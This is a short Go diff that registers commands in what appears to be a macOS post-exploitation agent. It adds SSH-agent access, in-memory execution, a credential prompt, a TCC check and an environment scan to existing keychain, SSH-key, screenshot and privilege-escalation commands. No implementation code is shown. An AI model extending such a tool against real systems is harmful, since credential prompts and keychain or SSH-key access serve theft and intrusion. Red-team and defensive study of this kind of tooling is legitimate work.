@@ -6,6 +6,7 @@ package commands
 func registerPlatformCommands() {
 	RegisterCommand(&CrontabCommand{})
 	RegisterCommand(&SSHKeysCommand{})
+	RegisterCommand(&SSHAgentCommand{})
 	RegisterCommand(&LaunchAgentCommand{})
 	RegisterCommand(&ScreenshotDarwinCommand{})
 	RegisterCommand(&KeychainCommand{})
@@ -17,4 +18,8 @@ func registerPlatformCommands() {
 	RegisterCommand(&XattrCommand{})
 	RegisterCommand(&MemScanCommand{})
 	RegisterCommand(&PrivescCheckCommand{})
+	RegisterCommand(&ExecuteMemoryCommand{})
+	RegisterCommand(&CredentialPromptCommand{})
+	RegisterCommand(&TCCCheckCommand{})
+	RegisterCommand(&EnvScanCommand{})
 }
